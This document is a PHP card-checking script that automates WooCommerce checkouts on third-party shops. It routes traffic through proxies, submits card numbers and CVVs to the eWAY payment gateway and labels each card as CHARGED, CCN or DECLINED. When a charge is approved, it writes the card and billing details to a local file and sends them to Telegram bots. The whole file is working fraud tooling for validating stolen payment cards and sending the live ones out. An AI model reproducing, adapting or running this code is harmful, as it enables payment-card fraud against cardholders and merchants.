<?php

# ------------- [ CODE BY RAIZO ]

error_reporting(0);
date_default_timezone_set('Asia/Manila');

include 'include/function.php';
include 'include/useragent.php';

ob_start();
include 'include/atc.php';

$urlComponents = parse_url($final_url);
$site2 = $urlComponents['host'];

include 'include/address.php';


# -------------------- [ ATC ] --------------- #
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $final_url);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'User-Agent: '.$ua,
   'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
$ATC = curl_exec($ch);
curl_close($ch);

if ($ATC) {
    $checkoutPattern = '/<a href="([^"]+)" class="button (checkout|btn-checkout) wc-forward">Checkout<\/a>|<a href="([^"]+)">Checkout<\/a>|<form[^>]+action="([^"]+)"[^>]*>/';

    if (preg_match($checkoutPattern, $response, $checkoutMatch)) {

        $checkout1 = $checkoutMatch[1] ?: $checkoutMatch[3] ?: $checkoutMatch[4];
         $checkout1;
    } else {
        $checkout1 = "https://$hostname/checkout";
    }
}

# -------------------- [ CHKOUT  ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $checkout1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");

$Checkout = curl_exec($ch);
curl_close($ch);
$nonce = trim(strip_tags(getStr($Checkout,'<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$patterns = '/<tr class="order-total">.*?<th>Total<\/th>\s*<td>\s*<strong>\s*<span class="woocommerce-Price-amount amount">\s*<bdi>\s*<span class="woocommerce-Price-currencySymbol">(.+?)<\/span>\s*([\d.]+)/s';
if (preg_match($patterns, $Checkout, $matches)) {
    $currency_symbol = $matches[1];
    $amount = $matches[2];
    if ($currency_symbol == '&pound;') {
        $currency_symbol = '£';
    }
}    
  $price1 = $currency_symbol . $amount;
    
$validationNonce = preg_match('/"address_validation_nonce":\s*"([^"]+)"/', $Checkout, $matches) ? $matches[1] : null;

#------------- [ VALIDATION ] ---------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/wp-admin/admin-ajax.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'user-agent: '.$ua,
    'x-requested-with: XMLHttpRequest',
]);

curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'action' => 'wc_avatax_validate_customer_address',
    'nonce' => $validationNonce,
    'type' => 'billing',
    'address_1' => $street,
    'address_2' => $street,
    'city' => $city,
    'state' => $state,
    'country' => $country,
    'postcode' => $zip,
]));

$validate = curl_exec($ch);
curl_close($ch);
# --------------- [ retries ] ----------- #

$retries = 0;

goers:

# ---------------- [ WC AJAX ] --------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/?wc-ajax=checkout");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
    'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'billing_first_name' => $fname,
    'billing_last_name' => $lname,
    'billing_company' => 'POTANGINAMO',
    'billing_customer_type' => 'personal',
    'billing_vat_number_uid' => 'DE392324340',
    'billing_country' => $country,
    'billing_address_1' => $street,
    'billing_address_2' => '',
    'billing_city' => $city,
    'billing_state' => $state,
    'billing_postcode' => $zip,
    'billing_phone' => $phone,
    'billing_email' => $email,
    'account_username' => $full_name.''.$phone,
    'account_password' => $full_name.''.$phone,
    'payment_method' => 'eway',
    'terms' => 'on',
    'terms-field' => '1',
    'woocommerce-process-checkout-nonce' => $nonce,
    '_wp_http_referer' => '/?wc-ajax=update_order_review',
]));

$Payment1 = curl_exec($ch);
curl_close($ch);

// Decode the JSON response
$responseData = json_decode($Payment1, true);

// Check if redirect link exists
$isRedirectValid = isset($responseData['redirect']) && !empty($responseData['redirect']); // Boolean condition

if (!$isRedirectValid) {
    // If redirect link is not valid or empty, stop processing and show only this response
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [ DECLINED ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
    exit;
}

// If redirect is valid, proceed with next cURL request
$redirectLink = $responseData['redirect'];
# -------------------- [ REDIRECT ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $redirectLink);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");

$response2 = curl_exec($ch);
curl_close($ch);
htmlentities($response2);

$dom = new DOMDocument();
@$dom->loadHTML($response2);
$xpath = new DOMXPath($dom);

// Extract EWAY_ACCESSCODE
$accessCodeNode = $xpath->query('//input[@name="EWAY_ACCESSCODE"]')->item(0);
if ($accessCodeNode) {
    $accessCodeValue = $accessCodeNode->getAttribute('value');
     "EWAY_ACCESSCODE: " . $accessCodeValue . "\n";
}

// Extract VISA_CHECKOUT_APIKEY
$apiKeyNode = $xpath->query('//input[@name="VISA_CHECKOUT_APIKEY"]')->item(0);
if ($apiKeyNode) {
    $apiKeyValue = $apiKeyNode->getAttribute('value');
     "VISA_CHECKOUT_APIKEY: " . $apiKeyValue . "\n";
}

// Extract VISA_CHECKOUT_ENCRYPTIONKEY
$encryptionKeyNode = $xpath->query('//input[@name="VISA_CHECKOUT_ENCRYPTIONKEY"]')->item(0);
if ($encryptionKeyNode) {
    $encryptionKeyValue = $encryptionKeyNode->getAttribute('value');
     "VISA_CHECKOUT_ENCRYPTIONKEY: " . $encryptionKeyValue . "\n";
}

# -------------------- [ ACCESSCODE ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://secure.ewaypayments.com/sharedpage/sharedpayment?AccessCode=$accessCodeValue");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");

$response = curl_exec($ch);
curl_close($ch);

// echo htmlentities($response);

# --------------- [ PROCESS PAYMENT ] ---------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://secure.ewaypayments.com/sharedpage/SharedPayment/ProcessPayment");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'EWAY_ACCESSCODE' => $accessCodeValue,
    'EWAY_ISSHAREDPAYMENT' => 'true',
    'EWAY_APPLYSURCHARGE' => 'true',
    'AMEXEC_ENCRYPTED_DATA' => '',
    'EWAY_CUSTOMERREADONLY' => 'False',
    'VISA_CHECKOUT_APIKEY' => $apiKeyValue,
    'VISA_CHECKOUT_ENCRYPTIONKEY' => $encryptionKeyValue,
    'FLAG_SHOW_SHIPADDR' => 'True',
    'FLAG_SHOW_CUSTADDR' => 'True',
    'FLAG_SHOW_SHIPPINGDETAILS' => 'False',
    'PAYMENT_TRANTYPE' => 'Purchase',
    'APPLEPAY_NETWORKTOKEN' => '',
    'EWAY_GOOGLEPAY_NETWORKTOKEN' => '',
    'EWAY_CUSTOMERFIRSTNAME' => $fname,
    'EWAY_CUSTOMERLASTNAME' => $lname,
    'EWAY_CUSTOMEREMAIL' => $email,
    'EWAY_CUSTOMERSTREET1' => $street,
    'EWAY_CUSTOMERSTREET2' => '',
    'EWAY_CUSTOMERCITY' => $city,
    'Customer.Country' => $country,
    'Customer.State.dropbox' => 'ACT',
    'Customer.State.textbox' => $state,
    'EWAY_CUSTOMERPOSTALCODE' => $zip,
    'EWAY_CUSTOMERPHONE' => $phone,
    'EWAY_SHIPPINGFIRSTNAME' => $fname,
    'EWAY_SHIPPINGLASTNAME' => $lname,
    'EWAY_SHIPPINGEMAIL' => $email,
    'EWAY_SHIPPINGSTREET1' => $street,
    'EWAY_SHIPPINGSTREET2' => '',
    'EWAY_SHIPPINGCITY' => $city,
    'ShippingAddress.Country' => $country,
    'ShippingAddress.State.dropbox' => 'ACT',
    'ShippingAddress.State.textbox' => $state,
    'EWAY_SHIPPINGPOSTALCODE' => $zip,
    'EWAY_SHIPPINGPHONE' => '',
    'EWAY_CARDNUMBER' => $cc,
    'EWAY_CARDNAME' => $fname,
    'EWAY_CARDEXPIRYMONTH' => $mes1,
    'EWAY_CARDEXPIRYYEAR' => $ano_no_20,
    'EWAY_CARDCVN' => $cvv,
]));

$response1 = curl_exec($ch);
curl_close($ch);
// echo htmlentities($response);
// Decode the JSON response
$responseData = json_decode($response1, true);

// Extract the redirect link
if (isset($responseData['redirecturl'])) {
    $redirect = $responseData['redirecturl'];
   "Redirect Link: <a href='$redirect'>$redirect</a>";
}

#------------------- [ LAST CURL REDIRECT ]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $redirect);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");

$Payment = curl_exec($ch);
curl_close($ch);
// echo htmlentities($Payment);

// Load the response into DOMDocument
$doc = new DOMDocument();
libxml_use_internal_errors(true); // Ignore HTML parsing errors
$doc->loadHTML($Payment);
libxml_clear_errors();

// Use XPath to extract the values
$xpath = new DOMXPath($doc);

// Get the Error Code value (label "Error Code")
$errorCode = $xpath->query("//ul[@class='info']/li[label='Error Code']/span");
$errorCodeValue = $errorCode->item(0)->nodeValue ?? '';

// Get the Message value (everything in the associated <span>)
$errorMessage = $xpath->query("//ul[@class='info']/li[label='Error Code']/following-sibling::li/span");
$errorMessageValue = $errorMessage->item(0)->nodeValue ?? '';

// Clean up the values
$errorCodeValue = trim($errorCodeValue);
$errorMessageValue = trim($errorMessageValue);

// Get the Transaction Status
$transactionStatus = $xpath->query("//ul[@class='info']/li[label='Transaction Status']/span");
$transactionStatusValue = $transactionStatus->item(0)->nodeValue ?? '';

$transactionStatusValue = trim($transactionStatusValue);

$Respo = $transactionStatusValue . " " . $errorCodeValue . " " . $errorMessageValue;


if (empty($Payment)) {
     "Payment data is empty!";
} else {
    $PaymentDecoded = html_entity_decode($Payment, ENT_QUOTES, 'UTF-8');
    $PaymentDecoded = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $PaymentDecoded);
    $decodedPayment = json_decode($PaymentDecoded, true);
    if (json_last_error() === JSON_ERROR_NONE) {
        if (isset($decodedPayment['messages'])) {
            $Respo = strip_tags($decodedPayment['messages']);
            $Respo = preg_replace('/\s+/', ' ', $Respo);
            $Respo = trim($Respo);
            $Respo = htmlentities($Respo, ENT_QUOTES, 'UTF-8');
             "Message: " . $Respo . "<br>";
        } else {
             "The 'messages' field is missing in the payment data.<br>";
        }
        if (isset($decodedPayment['redirect'])) {
            $receipt = $decodedPayment['redirect'];
            $receipt = htmlentities($receipt, ENT_QUOTES, 'UTF-8');
             "Redirect URL: " . $receipt;
        } else {
             "The 'redirect' field is missing in the payment data.";
        }
    } else {
         "Error decoding JSON: " . json_last_error_msg();
    }
}
$linky = trim(strip_tags(getstr($Payment, '"redirect":"','",')));
$orderid = trim(strip_tags(getstr($Payment, '"order_id":','}')));
$decodedResponse = json_decode($Payment, true);

if (isset($decodedResponse['redirect'])) {
    $receipt = $decodedResponse['redirect'];
}
 $receiptUrl = urldecode($receipt);

# ------------ [ UNLINK COOKIE ] ---------- #

unlink("".$curttt1."/COOKIE/".$inst['cookie']."");
ob_flush();

include 'include/tgforwarder.php';

#----------------- [ RESPONSE ]

if (strpos($transactionStatusValue, "Approved") !== false && strpos($Payment, 'order-received') !== false) { 
    echo '
        <div style="font-size: 14px;">
            ' . $badge_cvv . ' ' . $lista . ' [ CHARGED ] [AMOUNT: '.$price1.'] [' . $ip . ']  <a href="' . $hostname1 . '" target="_blank">SITE</a> <a href="' . $receiptUrl . '" target="_blank">RECEIPT</a> <br>
        </div>
    ';
$log_entry = "*GATEWAY : EWAY*\n";
$log_entry .= "*CVV* : `" . $escaped_lista . "`\n";
$log_entry .= "*Hostname* : `" . $escaped_hostname . "`\n";
$log_entry .= "*Name* : `" . $escaped_fname . "`\n";
$log_entry .= "*Lastname* : `" . $escaped_lname . "`\n";
$log_entry .= "*Street* : `" . $escaped_street . "`\n";
$log_entry .= "*City* : `" . $escaped_city . "`\n";
$log_entry .= "*State* : `" . $escaped_state . "`\n";
$log_entry .= "*Zip* : `" . $escaped_zip . "`\n";
$log_entry .= "*Country* : `" . $escaped_country . "`\n";
$log_entry .= "*Phone* : `" . $escaped_phone . "`\n";
$log_entry .= "*Email* : `" . $escaped_email . "`\n";

file_put_contents('cvveway.txt', $log_entry, FILE_APPEND | LOCK_EX);
sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);
sendToTelegram($default_bot_token, $default_chat_id, $log_entry);
} elseif (strpos($Respo, "CVV Validation Error") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_ccn . ' ' . $lista . ' [' . $Respo . '] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
    $log_entry = "CCN `" . $escaped_lista . "`\n";
    sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);
} elseif (strpos($Respo, "Insufficient Funds") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_ccn . ' ' . $lista . ' [' . $Respo . '] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
    $log_entry = "CCN `" . $escaped_lista . "`\n";
    sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);
} elseif (strpos($Payment1, "We were unable to process your order, please try again.") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [ Checkout Nonce Error ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
} elseif (strpos($Payment1, '{"result":"failure","messages":"","refresh":false,"reload":true}') !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [ Declined ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
} else {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [' . $transactionStatusValue . ' ' . $errorCodeValue . ' ' . $errorMessageValue . '] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
}

?>